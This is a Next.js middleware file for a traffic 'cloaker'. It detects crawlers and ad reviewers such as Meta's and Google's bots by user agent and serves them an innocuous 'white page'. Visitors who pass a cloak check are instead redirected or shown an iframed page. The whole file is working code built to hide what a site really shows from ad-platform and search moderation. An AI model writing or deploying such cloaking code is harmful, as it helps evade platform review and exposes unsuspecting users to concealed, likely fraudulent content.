import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";
import { checkCloak, whitePageHtml } from "@/lib/cloaker";

const CRAWLER_UA =
  /facebookexternalhit|Facebot|Meta-ExternalAgent|meta-externalagent|Instagram|LinkedInBot|Twitterbot|Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|ia_archiver|WhatsApp|TelegramBot|Pinterestbot|Snapchat|AdsBot-Google/i;

function bypassCloak(pathname: string): boolean {
  return (
    pathname.startsWith("/api") ||
    pathname.startsWith("/crm") ||
    pathname.startsWith("/_next") ||
    pathname.startsWith("/assets") ||
    pathname === "/robots.txt" ||
    pathname === "/subeler.html" ||
    pathname.endsWith(".svg") ||
    pathname.endsWith(".png") ||
    pathname.endsWith(".json") ||
    pathname.endsWith(".ttf") ||
    pathname.endsWith(".woff") ||
    pathname.endsWith(".woff2")
  );
}

function serveWhitePage(request: NextRequest) {
  return NextResponse.rewrite(new URL("/subeler.html", request.url));
}

export async function middleware(request: NextRequest) {
  const ua = request.headers.get("user-agent") ?? "";
  const { pathname } = request.nextUrl;

  if (bypassCloak(pathname)) {
    return NextResponse.next();
  }

  if (CRAWLER_UA.test(ua)) {
    return serveWhitePage(request);
  }

  const cloak = await checkCloak(request);

  if (!cloak) {
    return serveWhitePage(request);
  }

  if (cloak.page === "white") {
    if (cloak.redirectUrl) {
      return NextResponse.redirect(cloak.redirectUrl, 302);
    }
    return serveWhitePage(request);
  }

  if (cloak.redirectUrl) {
    return NextResponse.redirect(cloak.redirectUrl, 302);
  }

  if (cloak.iframeUrl) {
    return new NextResponse(whitePageHtml(cloak.iframeUrl), {
      headers: { "Content-Type": "text/html; charset=utf-8" },
    });
  }

  return NextResponse.next();
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
};
